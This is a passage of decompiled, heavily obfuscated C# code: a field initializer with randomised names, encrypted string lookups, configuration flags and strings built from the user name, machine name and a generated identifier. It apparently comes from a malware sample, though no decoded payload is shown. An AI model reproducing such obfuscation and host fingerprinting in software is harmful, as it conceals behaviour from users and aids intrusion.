			UPTUMFgiFSZjXAR(getString_0(107406146)),
			UPTUMFgiFSZjXAR(getString_0(107406073)),
			UPTUMFgiFSZjXAR(getString_0(107406040)),
			UPTUMFgiFSZjXAR(getString_0(107406031)),
			UPTUMFgiFSZjXAR(getString_0(107405998)),
			UPTUMFgiFSZjXAR(getString_0(107407320)),
			UPTUMFgiFSZjXAR(getString_0(107405957)),
			UPTUMFgiFSZjXAR(getString_0(107406396)),
			UPTUMFgiFSZjXAR(getString_0(107406383)),
			UPTUMFgiFSZjXAR(getString_0(107406350)),
			UPTUMFgiFSZjXAR(getString_0(107406309)),
			UPTUMFgiFSZjXAR(getString_0(107406236)),
			UPTUMFgiFSZjXAR(getString_0(107406203)),
			UPTUMFgiFSZjXAR(getString_0(107405650)),
			UPTUMFgiFSZjXAR(getString_0(107405641)),
			UPTUMFgiFSZjXAR(getString_0(107407287)),
			UPTUMFgiFSZjXAR(getString_0(107405568)),
			UPTUMFgiFSZjXAR(getString_0(107407274)),
			UPTUMFgiFSZjXAR(getString_0(107405535)),
			UPTUMFgiFSZjXAR(getString_0(107405502)),
			UPTUMFgiFSZjXAR(getString_0(107405461)),
			UPTUMFgiFSZjXAR(getString_0(107405428)),
			UPTUMFgiFSZjXAR(getString_0(107405931)),
			UPTUMFgiFSZjXAR(getString_0(107405890)),
			UPTUMFgiFSZjXAR(getString_0(107405857)),
			UPTUMFgiFSZjXAR(getString_0(107405792)),
			UPTUMFgiFSZjXAR(getString_0(107405751)),
			UPTUMFgiFSZjXAR(getString_0(107405742)),
			UPTUMFgiFSZjXAR(getString_0(107405701))
		};
		RoJahsXJTpPr = new List<string>
		{
			UPTUMFgiFSZjXAR(rKFkgeHGiEjCWNc(getString_0(107405116))),
			UPTUMFgiFSZjXAR(getString_0(107405099)),
			UPTUMFgiFSZjXAR(getString_0(107405006)),
			UPTUMFgiFSZjXAR(getString_0(107405421)),
			UPTUMFgiFSZjXAR(getString_0(107405328)),
			UPTUMFgiFSZjXAR(getString_0(107405231)),
			UPTUMFgiFSZjXAR(getString_0(107404594)),
			UPTUMFgiFSZjXAR(getString_0(107404497)),
			UPTUMFgiFSZjXAR(getString_0(107404404)),
			UPTUMFgiFSZjXAR(getString_0(107404819)),
			UPTUMFgiFSZjXAR(getString_0(107404726)),
			UPTUMFgiFSZjXAR(getString_0(107404117)),
			UPTUMFgiFSZjXAR(getString_0(107404024)),
			UPTUMFgiFSZjXAR(rKFkgeHGiEjCWNc(getString_0(107405116)))
		};
		qYTUzbeVAfOi = UPTUMFgiFSZjXAR(getString_0(107403927));
		VthTCnZGROUQ = new List<string>
		{
			UPTUMFgiFSZjXAR(getString_0(107404358)),
			UPTUMFgiFSZjXAR(getString_0(107404164)),
			UPTUMFgiFSZjXAR(getString_0(107403458)),
			UPTUMFgiFSZjXAR(getString_0(107403744)),
			UPTUMFgiFSZjXAR(getString_0(107403038)),
			UPTUMFgiFSZjXAR(getString_0(107403356))
		};
		NHGmvOxrKHyNP = new List<string>
		{
			UPTUMFgiFSZjXAR(getString_0(107403162)),
			UPTUMFgiFSZjXAR(getString_0(107402589)),
			UPTUMFgiFSZjXAR(getString_0(107402528))
		};
		ndUwUldieebQzGih = getString_0(107397050);
		IOfSFewnzxVZ = getString_0(107397050);
		wepmbNgrJijpUDvo = new DateTime(2000, 1, 1);
		DiXQaVbikGJ = new DateTime(2100, 1, 1);
		SKaLbyEOuXGH = getString_0(107396890);
		YyzRRVpMLORcsyqnO = getString_0(107384959);
		MtvVnKjDFJw = getString_0(107397050);
		xgTNcSYvJYBSq = getString_0(107397050);
		SKRjkZjDmCiXnd = getString_0(107397050);
		qIApKptthvBp = getString_0(107396890);
		JXiTOIwfKbK = getString_0(107397050);
		JpHrjpLDqbGD = getString_0(107397050);
		puDhoHwRWOSf = new List<string>
		{
			getString_0(107395822),
			getString_0(107396048),
			getString_0(107395856),
			getString_0(107395385)
		};
		vxbhvYdpuaSKJ = getString_0(107397050);
		tNcTgyProIDND = getString_0(107402499);
		dgJhnLCfNBcxC = getString_0(107396890);
		lbqZZzWjuHIRTQT = getString_0(107397050);
		UsTyHhCSuel = getString_0(107397050);
		keGLFzObTnAtzz = string.Empty;
		EfarEYXTKyxduNx = getString_0(107397050);
		LWwfcoAeJyJA = getString_0(107397050);
		EzCobbjvThbw = getString_0(107397050);
		ohrGiDqyRybVB = getString_0(107388093);
		xUkWNCorrSa = getString_0(107388093);
		ZVnlTejmEDuZV = getString_0(107397050);
		ZdlDALrfEgIh = getString_0(107396890);
		bucWzIppHMvQj = getString_0(107396890);
		OOPEuQcNuNv = getString_0(107397050);
		LhORCovagF = getString_0(107397050);
		gTnzkxbQUizp = getString_0(107402462);
		WVAOfhrGMujCTSQ = getString_0(107397050);
		jVqUdWsOSlw = getString_0(107397050);
		ireqQCxdFVeGmt = getString_0(107402477);
		oIKxpRPmsxTM = getString_0(107397050);
		vFFNGQSlKJOD = getString_0(107397050);
		fPPatcTvdOeP = getString_0(107396890);
		FoQUNbbHSpsiGn = getString_0(107397050);
		kMCWJkiChJOZyQGt = getString_0(107402428);
		pFIiheiUxUaqmQ = getString_0(107396890);
		dmfMWdUvIkOnV = getString_0(107396890);
		YNeUwytrJMgeT = getString_0(107397050);
		MxJbfRBhftsQtF = getString_0(107397050);
		KQisENgjpTpjV = new string[0];
		kVikcklGsTH = getString_0(107397050);
		CpKJVfXcbzad = true;
		ctlTkMVzwMpug = getString_0(107397050);
		csOkMUvFRZv = true;
		ofDVylLNMrZJbjz = false;
		YNULXblmbyCUDSh = false;
		CYFeVMjCnWVQdE = false;
		PhOHjwgFpwoPkI = getString_0(107402447);
		WkkVnLAdbtG = false;
		WKQlCLDPCsI = false;
		nbZEuQsHonQlJS = true;
		EKGlgxikXbv = false;
		oaSbtWubulI = true;
		zwVfmDiFyzMi = getString_0(107402394) + Environment.UserName + getString_0(107402413) + Environment.MachineName + getString_0(107402360) + boHoxxDHHXchTbg.wdLdkHIHAypDJRkz() + getString_0(107402355);
		vktNUmAHjywZJ = false;
		fTMAhxgRDBhnY = new Stopwatch();
		WuLujtLeXYYG = 0;
		LFhiMkBTtnH = 0;
		fRMdlZMqiQJlz = false;
		QhhcIiFyoEG = getString_0(107402378) + boHoxxDHHXchTbg.wdLdkHIHAypDJRkz() + getString_0(107402369);
		kgUAzEZWsZg = new string[1] { getString_0(107402844) };
		DAaKZBFWVuae = new List<string>();
		UkCNBuKDQgtRHv = 0;
		eljmNNVfvvqwP = new List<string>();
		bLTTMNyJBiXTe = new List<string>();
		dsVUMhqXtsa = new List<string>();
	}
}
